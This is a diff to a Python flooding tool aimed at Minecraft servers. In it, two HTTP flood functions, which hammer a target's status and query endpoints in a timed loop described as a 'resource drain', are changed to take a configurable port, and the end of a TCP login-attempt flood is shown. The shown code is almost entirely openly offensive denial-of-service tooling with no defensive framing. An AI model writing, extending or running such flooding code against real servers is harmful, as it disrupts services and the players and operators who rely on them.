@@ -118,10 +118,10 @@ def tcp_login(ip, port, duration, packet_size):
     print(Fore.GREEN + f"[✅] Done! Sent {packet_count} login attempts.")
 
 # Layer 7 HTTP Methods (Minecraft-specific resource drain)
-def http_status_flood(ip, duration):
+def http_status_flood(ip, port, duration):
     end_time = time.time() + duration
     request_count = 0
-    url = f"http://{ip}:5555/status"  # Common Minecraft web status endpoint
+    url = f"http://{ip}:{port}/status"  # Common Minecraft web status endpoint
     print(Fore.CYAN + f"[🚀] HTTP Status Flood on {url} | {duration}s...")
     try:
         while time.time() < end_time:
@@ -131,10 +131,10 @@ def http_status_flood(ip, duration):
         print(Fore.RED + f"[❌] Error: {e}")
     print(Fore.GREEN + f"[✅] Done! Sent {request_count} status requests.")
 
-def http_query_flood(ip, duration):
+def http_query_flood(ip, port, duration):
     end_time = time.time() + duration
     request_count = 0
-    url = f"http://{ip}:5555/query"  # Common Minecraft query endpoint
+    url = f"http://{ip}:{port}/query"  # Common Minecraft query endpoint
     print(Fore.CYAN + f"[🚀] HTTP Query Flood on {url} | {duration}s...")
     try:
         while time.time() < end_time:
